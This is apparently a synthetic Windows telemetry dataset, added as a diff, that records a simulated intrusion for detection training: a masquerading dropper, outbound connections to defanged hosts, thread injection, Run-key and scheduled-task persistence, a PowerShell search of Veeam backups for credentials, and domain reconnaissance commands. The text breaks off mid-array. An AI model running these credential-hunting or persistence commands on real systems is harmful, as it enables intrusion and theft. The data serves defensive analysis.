@@ -1,0 +1,3272 @@
+{
+  "dataset_type": "synthetic_raw_windows_telemetry",
+  "format_note": "Raw telemetry only. Ground-truth labels, MITRE technique mappings, IOC reference lists, and synthetic case labels are removed from each event.",
+  "total_events": 51,
+  "log_sources": [
+    "Microsoft-Windows-Sysmon/Operational",
+    "Security",
+    "Microsoft-Windows-PowerShell/Operational",
+    "Synthetic Windows EDR-like Sensor"
+  ],
+  "events": [
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 1
+      },
+      "@timestamp": "2024-05-16T08:13:22.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920001,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-b810e730-e973-4a96-89ec-f348918f90cf",
+        "executable": "C:\\Users\\j.smith\\Downloads\\setup_wm.exe",
+        "name": "setup_wm.exe",
+        "command_line": "\"C:\\Users\\j.smith\\Downloads\\setup_wm.exe\"",
+        "pid": 6612,
+        "parent": {
+          "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+          "name": "chrome.exe",
+          "command_line": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+        }
+      },
+      "file": {
+        "name": "setup_wm.exe",
+        "path": "C:\\Users\\j.smith\\Downloads\\setup_wm.exe",
+        "hash": {
+          "md5": "57f791f7477b1f7a1b3605465d054db8",
+          "sha1": "bba1bc3ebf07ca3c4e2442f0ba9ea18383ce627b",
+          "sha256": "d8b2d883d3b376833fa8e2093e82d0a118ba13b01a2054f8447f57d9fec67030"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 2
+      },
+      "@timestamp": "2024-05-16T08:13:27.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920002,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\Users\\j.smith\\Downloads\\setup_wm.exe",
+        "name": "setup_wm.exe",
+        "pid": 2528
+      },
+      "file": {
+        "name": "svchosts.exe",
+        "path": "C:\\ProgramData\\svchosts.exe",
+        "hash": {
+          "md5": "6505b488d0c7f3eaee66e3db103d7b05",
+          "sha1": "bf2b396b8fb0b1de27678aab877b6f177546d1c5",
+          "sha256": "b4ad5df385ee964fe9a800f2cdaa03626c8e8811ddb171f8e821876373335e63"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 3
+      },
+      "@timestamp": "2024-05-16T08:14:04.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920003,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\svchosts.exe",
+        "name": "svchosts.exe",
+        "pid": 6255
+      },
+      "source": {
+        "ip": "10.10.6.91",
+        "port": 56668
+      },
+      "destination": {
+        "ip": "31.172.83[.]162",
+        "port": 443
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "protocol"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "22",
+        "action": "DNS query",
+        "sequence": 4
+      },
+      "@timestamp": "2024-05-16T08:14:10.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 22,
+        "record_id": 920004,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\svchosts.exe",
+        "name": "svchosts.exe",
+        "pid": 7274
+      },
+      "dns": {
+        "question": {
+          "name": "user[.]compdatasystems[.]com",
+          "type": "A"
+        },
+        "answers": [
+          {
+            "type": "A",
+            "data": "159.100.14.254"
+          }
+        ]
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "protocol"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "22",
+        "action": "DNS query",
+        "sequence": 5
+      },
+      "@timestamp": "2024-05-16T08:14:15.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 22,
+        "record_id": 920005,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\svchosts.exe",
+        "name": "svchosts.exe",
+        "pid": 3586
+      },
+      "dns": {
+        "question": {
+          "name": "compdatasystems[.]com",
+          "type": "A"
+        },
+        "answers": [
+          {
+            "type": "A",
+            "data": "159.100.14.254"
+          }
+        ]
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 6
+      },
+      "@timestamp": "2024-05-16T08:14:21.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920006,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\svchosts.exe",
+        "name": "svchosts.exe",
+        "pid": 7132
+      },
+      "source": {
+        "ip": "10.10.5.181",
+        "port": 59877
+      },
+      "destination": {
+        "ip": "159.100.14[.]254",
+        "port": 443
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "protocol"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "22",
+        "action": "DNS query",
+        "sequence": 7
+      },
+      "@timestamp": "2024-05-16T08:14:26.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 22,
+        "record_id": 920007,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\svchosts.exe",
+        "name": "svchosts.exe",
+        "pid": 6214
+      },
+      "dns": {
+        "question": {
+          "name": "retailadvertisingservices[.]com",
+          "type": "A"
+        },
+        "answers": [
+          {
+            "type": "A",
+            "data": "159.100.14.254"
+          }
+        ]
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "change"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "8",
+        "action": "CreateRemoteThread detected",
+        "sequence": 8
+      },
+      "@timestamp": "2024-05-16T08:17:10.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 8,
+        "record_id": 920008,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "NT AUTHORITY",
+        "name": "SYSTEM"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\svchosts.exe",
+        "name": "svchosts.exe",
+        "pid": 4376
+      },
+      "winlog.event_data": {
+        "SourceImage": "C:\\ProgramData\\svchosts.exe",
+        "TargetImage": "C:\\Windows\\System32\\rundll32.exe",
+        "StartAddress": "0x0000021A4C6B0000",
+        "StartModule": "",
+        "StartFunction": ""
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 9
+      },
+      "@timestamp": "2024-05-16T08:18:32.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920009,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\rundll32.exe",
+        "name": "rundll32.exe",
+        "pid": 5719
+      },
+      "file": {
+        "name": "svc.dll",
+        "path": "C:\\ProgramData\\svc.dll",
+        "hash": {
+          "md5": "03af38505cee81b9d6ecd8c1fd896e0e",
+          "sha1": "1ac66fcc34c0b86def886e4e168030dae096927c",
+          "sha256": "2389b3978887ec1094b26b35e21e9c77826d91f7fa25b2a1cb5ad836ba2d7ec4"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "registry"
+        ],
+        "type": [
+          "change"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "13",
+        "action": "Registry value set",
+        "sequence": 10
+      },
+      "@timestamp": "2024-05-16T08:20:14.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 13,
+        "record_id": 920010,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "NT AUTHORITY",
+        "name": "SYSTEM"
+      },
+      "registry": {
+        "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSvc",
+        "value": "WinSvc",
+        "data": {
+          "strings": [
+            "C:\\ProgramData\\svchosts.exe"
+          ]
+        }
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\svchosts.exe",
+        "name": "svchosts.exe",
+        "pid": 4376
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "configuration"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "code": "4698",
+        "action": "A scheduled task was created",
+        "sequence": 11
+      },
+      "@timestamp": "2024-05-16T08:20:45.0000Z",
+      "winlog": {
+        "channel": "Security",
+        "provider_name": "Microsoft-Windows-Security-Auditing",
+        "event_id": 4698,
+        "record_id": 554332,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "winlog.event_data": {
+        "TaskName": "\\Microsoft\\Windows\\Update\\WinSvcUpdate",
+        "TaskContent": "<Actions><Exec><Command>rundll32.exe</Command><Arguments>C:\\ProgramData\\svc.dll,Start</Arguments></Exec></Actions>"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "info"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-PowerShell",
+        "code": "4104",
+        "action": "PowerShell script block logging",
+        "sequence": 12
+      },
+      "@timestamp": "2024-05-16T08:23:40.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-PowerShell/Operational",
+        "provider_name": "Microsoft-Windows-PowerShell",
+        "event_id": 4104,
+        "record_id": 77413,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "name": "powershell.exe",
+        "command_line": "powershell.exe -NoP -ExecutionPolicy Bypass -File C:\\ProgramData\\Veeam-Get-Creds.ps1"
+      },
+      "powershell": {
+        "file": {
+          "script_block_text": "Get-ChildItem 'C:\\ProgramData\\Veeam\\Backup' -Recurse | Select-String -Pattern 'password|credentials|user'"
+        }
+      },
+      "file": {
+        "name": "Veeam-Get-Creds.ps1",
+        "path": "C:\\ProgramData\\Veeam-Get-Creds.ps1",
+        "hash": {
+          "md5": "0f7b6bb3a239cf7a668a8625e6332639",
+          "sha1": "5263a135f09185aa44f6b73d2f8160f56779706d",
+          "sha256": "18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 13
+      },
+      "@timestamp": "2024-05-16T08:25:22.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920047,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-c74556d5-a586-4574-9251-419f261c1204",
+        "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "name": "WINWORD.EXE",
+        "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\j.smith\\Documents\\Quarterly_Report.docx\"",
+        "pid": 5653,
+        "parent": {
+          "executable": "C:\\Windows\\explorer.exe",
+          "name": "explorer.exe",
+          "command_line": "C:\\Windows\\explorer.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 14
+      },
+      "@timestamp": "2024-05-16T08:27:09.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920013,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-e52e5a9c-ece3-4e17-82d4-1fc020bd2a3b",
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /c net group \"Domain Admins\" /domain",
+        "pid": 5003,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "name": "powershell.exe",
+          "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 15
+      },
+      "@timestamp": "2024-05-16T08:27:30.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920014,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-35d90513-6b6d-4712-964d-ba0a4cd0bf75",
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /c net user /domain",
+        "pid": 3375,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "name": "powershell.exe",
+          "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 16
+      },
+      "@timestamp": "2024-05-16T08:28:04.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920015,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-f66d5db9-d74c-4a0f-aa18-6b8edefd2b79",
+        "executable": "C:\\Windows\\System32\\nltest.exe",
+        "name": "nltest.exe",
+        "command_line": "nltest.exe /domain_trusts",
+        "pid": 4538,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 17
+      },
+      "@timestamp": "2024-05-16T08:29:41.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920016,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-ce479ac5-a3b2-4031-b671-256b4bcf6a28",
+        "executable": "C:\\Windows\\System32\\gpresult.exe",
+        "name": "gpresult.exe",
+        "command_line": "gpresult.exe /r /scope computer",
+        "pid": 8135,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 18
+      },
+      "@timestamp": "2024-05-16T08:31:17.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920017,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-f26e06e4-d3e7-44e4-8636-31a24c18a5c6",
+        "executable": "C:\\Windows\\System32\\tasklist.exe",
+        "name": "tasklist.exe",
+        "command_line": "tasklist.exe /v",
+        "pid": 7810,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 19
+      },
+      "@timestamp": "2024-05-16T08:33:55.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920018,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-c1bb2023-e08f-45c0-8ef4-5c0cdc898fab",
+        "executable": "C:\\Windows\\System32\\net.exe",
+        "name": "net.exe",
+        "command_line": "net view /domain",
+        "pid": 6300,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 20
+      },
+      "@timestamp": "2024-05-16T08:36:21.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920019,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-4b0d145b-d37b-4985-8112-56c0f6d45e57",
+        "executable": "C:\\Windows\\System32\\rundll32.exe",
+        "name": "rundll32.exe",
+        "command_line": "rundll32.exe C:\\ProgramData\\svcmc.dll,Start",
+        "pid": 8068,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
